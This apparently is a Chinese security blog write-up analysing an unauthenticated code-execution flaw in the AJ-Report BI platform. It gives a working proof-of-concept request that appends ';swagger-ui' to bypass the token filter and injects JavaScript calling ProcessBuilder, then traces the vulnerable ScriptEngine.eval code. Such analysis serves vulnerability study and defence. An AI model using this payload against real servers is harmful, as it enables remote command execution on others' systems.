#  AJ-Report代码执行漏洞分析   
原创 莫大130  安全逐梦人   2024-05-04 16:52  
  
# AJ-Report代码执行漏洞分析  
  
AJ-Report是全开源的一个BI平台，酷炫大屏展示，能随时随地掌控业务动态，让每个决策都有数据支撑  
  
DataSetParamController 中verification 方法未对传入的参数进行过滤，可以执行JavaScript函数，导致命令执行漏洞。  
## 环境搭建  
  
将源码下并使用IDEA打开  
```
git clone https://gitee.com/anji-plus/report.git 
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSojibLPXqojhXOYTZib2t1ic4L0QPgqhHU8icreMHrOxpMXEswxlsQdCiczZBg/640?wx_fmt=png&from=appmsg "")  
### 配置mysql  
  
创建数据 aj_report ，数据库sql文件在resources/db.migration 目录下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSojt6CcaMwmXy4kVzJQ4F9M6Kcc1rRd29xkIhgJ30eXWDH4VsMK2lzSGQ/640?wx_fmt=png&from=appmsg "")  
  
配置文件存储路径  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSojiab2ljtktJciauBBugGhibeY0hEKibcH82nzhjA9lctjKeNEcUP2uHicneA/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
```
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1 Host: 192.168.0.100:9095 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Content-Type: application/json;charset=UTF-8 Connection: close  {"sampleItem":"1","validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"whoami\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"} 
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSojF3RfVMcgqgB2q0Q8xfIdO3KicEVoibkK0QpVj8mzQhxibXhQo3pR3RPrw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSojRuZiaWSmL9ZZMNZMFlWqaBb4rh1y284UAdreicGZFJFceicZlbGvsicwicw/640?wx_fmt=png&from=appmsg "")  
## 代码分析  
### 漏洞路径  
  
\report\report-core\src\main\java\com\anjiplus\template\gaea\business\modules\datasetparam\controller\DataSetParamController.java  
#### verification  
```
    @PostMapping("/verification")     public ResponseBean verification(@Validated @RequestBody DataSetParamValidationParam param) {         DataSetParamDto dto = new DataSetParamDto();         dto.setSampleItem(param.getSampleItem());         dto.setValidationRules(param.getValidationRules());         return responseSuccessWithData(dataSetParamService.verification(dto));     } 
```  
  
param 接受传入的值  
```
@Data public class DataSetParamValidationParam implements Serializable {      /** 参数示例项 */     @NotBlank(message = "sampleItem not empty")     private String sampleItem;       /** js校验字段值规则，满足校验返回 true */     @NotBlank(message = "validationRules not empty")     private String validationRules; } 
```  
  
需要接受的参数 sampleItem ，validationRules  
  
并将这个参数传入dataSetParamService.verification(dto)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSojKbVkrxDwG3Hta5jVjnwjvdfcm3NwW6rfSiciaTY5I4gMhibYkddPu2QUQ/640?wx_fmt=png&from=appmsg "")  
#### DataSetParamServiceImpl.java  
  
该类中实现了 verification 方法  
```
  package com.anjiplus.template.gaea.business.modules.datasetparam.service.impl;  import com.anji.plus.gaea.curd.mapper.GaeaBaseMapper; import com.anji.plus.gaea.exception.BusinessExceptionBuilder; import com.anjiplus.template.gaea.business.modules.datasetparam.controller.dto.DataSetParamDto; import com.anjiplus.template.gaea.business.modules.datasetparam.dao.DataSetParamMapper; import com.anjiplus.template.gaea.business.modules.datasetparam.dao.entity.DataSetParam; import com.anjiplus.template.gaea.business.modules.datasetparam.service.DataSetParamService; import com.anjiplus.template.gaea.business.modules.datasetparam.util.ParamsResolverHelper; import com.anjiplus.template.gaea.business.code.ResponseCode; import com.fasterxml.jackson.databind.ObjectMapper; import lombok.extern.slf4j.Slf4j; import org.apache.commons.lang3.StringUtils; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service;  import javax.script.Invocable; import javax.script.ScriptEngine; import javax.script.ScriptEngineManager; import java.util.HashMap; import java.util.List; import java.util.Map;  /** * @desc DataSetParam 数据集动态参数服务实现 * @author Raod * @date 2021-03-18 12:12:33.108033200 **/ @Service //@RequiredArgsConstructor @Slf4j public class DataSetParamServiceImpl implements DataSetParamService {      private ScriptEngine engine;     {         ScriptEngineManager manager = new ScriptEngineManager();         engine = manager.getEngineByName("JavaScript");     }      @Autowired     private DataSetParamMapper dataSetParamMapper;      @Override     public GaeaBaseMapper<DataSetParam> getMapper() {       return dataSetParamMapper;     }      /**      * 参数替换      *      * @param contextData      * @param dynSentence      * @return      */     @Override     public String transform(Map<String, Object> contextData, String dynSentence) {         if (StringUtils.isBlank(dynSentence)) {             return dynSentence;         }         if (dynSentence.contains("${")) {             dynSentence = ParamsResolverHelper.resolveParams(contextData, dynSentence);         }         if (dynSentence.contains("${")) {             throw BusinessExceptionBuilder.build(ResponseCode.INCOMPLETE_PARAMETER_REPLACEMENT_VALUES, dynSentence);         }         return dynSentence;     }      /**      * 参数替换      *      * @param dataSetParamDtoList      * @param dynSentence      * @return      */     @Override     public String transform(List<DataSetParamDto> dataSetParamDtoList, String dynSentence) {         Map<String, Object> contextData = new HashMap<>();         if (null == dataSetParamDtoList || dataSetParamDtoList.size() <= 0) {             return dynSentence;         }         dataSetParamDtoList.forEach(dataSetParamDto -> {             contextData.put(dataSetParamDto.getParamName(), dataSetParamDto.getSampleItem());         });         return transform(contextData, dynSentence);     }      /**      * 参数校验  js脚本      *      * @param dataSetParamDto      * @return      */     @Override     public Object verification(DataSetParamDto dataSetParamDto) {          String validationRules = dataSetParamDto.getValidationRules();         if (StringUtils.isNotBlank(validationRules)) {             try {                 engine.eval(validationRules);                 if(engine instanceof Invocable){                     Invocable invocable = (Invocable) engine;                     Object exec = invocable.invokeFunction("verification", dataSetParamDto);                     ObjectMapper objectMapper = new ObjectMapper();                     if (exec instanceof Boolean) {                         return objectMapper.convertValue(exec, Boolean.class);                     }else {                         return objectMapper.convertValue(exec, String.class);                     }                  }              } catch (Exception ex) {                 throw BusinessExceptionBuilder.build(ResponseCode.EXECUTE_JS_ERROR, ex.getMessage());             }          }         return true;     }      /**      * 参数校验  js脚本      *      * @param dataSetParamDtoList      * @return      */     @Override     public boolean verification(List<DataSetParamDto> dataSetParamDtoList, Map<String, Object> contextData) {         if (null == dataSetParamDtoList || dataSetParamDtoList.size() == 0) {             return true;         }          for (DataSetParamDto dataSetParamDto : dataSetParamDtoList) {             if (null != contextData) {                 String value = contextData.getOrDefault(dataSetParamDto.getParamName(), "").toString();                 dataSetParamDto.setSampleItem(value);             }              Object verification = verification(dataSetParamDto);             if (verification instanceof Boolean) {                 if (!(Boolean) verification) {                     return false;                 }             }else {                 //将得到的值重新赋值给contextData                 if (null != contextData) {                     contextData.put(dataSetParamDto.getParamName(), verification);                 }                 dataSetParamDto.setSampleItem(verification.toString());             }          }         return true;     }  }  
```  
##### verification  
```
   @Override     public Object verification(DataSetParamDto dataSetParamDto) {          String validationRules = dataSetParamDto.getValidationRules();         if (StringUtils.isNotBlank(validationRules)) {             try {                 engine.eval(validationRules);                 if(engine instanceof Invocable){                     Invocable invocable = (Invocable) engine;                     Object exec = invocable.invokeFunction("verification", dataSetParamDto);                     ObjectMapper objectMapper = new ObjectMapper();                     if (exec instanceof Boolean) {                         return objectMapper.convertValue(exec, Boolean.class);                     }else {                         return objectMapper.convertValue(exec, String.class);                     }                  }              } catch (Exception ex) {                 throw BusinessExceptionBuilder.build(ResponseCode.EXECUTE_JS_ERROR, ex.getMessage());             }          }         return true;     } 
```  
```
    private ScriptEngine engine;     {         ScriptEngineManager manager = new ScriptEngineManager();         engine = manager.getEngineByName("JavaScript");     } 
```  
  
engine.eval(validationRules): 这行代码使用了一个 engine是 ScriptEngine 的一个实例，来执行传入的 validationRules 字符串，即执行一段 JavaScript 代码。  
  
if(engine instanceof Invocable) 这里检查 engine 是否是 Invocable 接口的实例，如果是，表示这个引擎可以调用 JavaScript 函数。  
  
invocable.invokeFunction("verification", dataSetParamDto): 如果引擎可以调用，就调用名为 "verification" 的 JavaScript 函数，并传入一个 dataSetParamDto 对象作为参数。  
  
ObjectMapper objectMapper = new ObjectMapper(): 创建了一个ObjectMapper对象，用于处理 JSON 数据。  
```
 if (exec instanceof Boolean) {     return objectMapper.convertValue(exec, Boolean.class);   }else {      return objectMapper.convertValue(exec, String.class);  } 
```  
  
根据 exec 对象的类型进行处理，如果是布尔类型，则将其转换为 Java 中的 Boolean 类型；否则转换为 String 类型。  
  
return objectMapper.convertValue(...): 最后，根据 exec 的类型，使用 ObjectMapper 将其转换成相应的 Java 类型，并返回结果。  
### debug 调试  
  
下断点  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSojz6tXjV3OrLCWicMuNYoyib0nwHWdlZ1rIYV8bQFGsAdMR1kCk962gVFA/640?wx_fmt=png&from=appmsg "")  
  
validationRules 值为JavaScript 代码  
  
调用了ScriptEngineManager eval执行JavaScript 代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSojMFNCAtgys6Csia4ANpyB8CciaY1GIChoFYfqmqJxiaViaGN91AEWiajXmBg/640?wx_fmt=png&from=appmsg "")  
### 权限验证  
  
正常访问 /dataSetParam/verification 路由是需要token验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSojibBWQhJiaI57PunK42c6ooJzv9VUbicHoDxH4q2pAVsGv8cHfNW2t1gKA/640?wx_fmt=png&from=appmsg "")  
  
搜索 The Token has expired  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSoj29LFjTGcVdl3Nr0c3iaUbExZErUuSZBoqzE2YXwBFIX0EKaayAt4JwQ/640?wx_fmt=png&from=appmsg "")  
#### TokenFilter.java  
  
TokenFilter拦截器中，放行swagger-ui，swagger-resources  
```
if (uri.contains("swagger-ui") || uri.contains("swagger-resources")) {     filterChain.doFilter(request, response);     return; } 
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSoj8PibvoQw5fNZkak6jTiaiaZa8Tv3U8QJshTcg341BYnItmV4IZe5DkcNA/640?wx_fmt=png&from=appmsg "")  
#### 使用URL截断绕过 ;  
  
swagger-ui，swagger-resources  
```
POST /dataSetParam/verification;swagger-ui HTTP/1.1  POST /dataSetParam/verification;swagger-resources HTTP/1.1 
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSoj98B6QTPTkiawlZLsNKujkUDrmfqvFORawlHfkeMsJArdo6ByGXnK23Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSojbRBorSARqf4HpB5C10lBzxOiayAoCqR8ianmMIDapTxSzrdNdfvZlsag/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz47sbjmIEkIHcV63QoFbSoj1ic7npBaS7iam41tck8pM8LEeQoiblxLicphUKbS84P09gb5rlUw3pf2Gg/640?wx_fmt=png&from=appmsg "")  
### 总结  
- verification方法传入参数validationRules，调用了ScriptEngineManager eval执行JavaScript 代码，导致的代码执行漏洞。  
  
- 使用; 绕过鉴权  
  
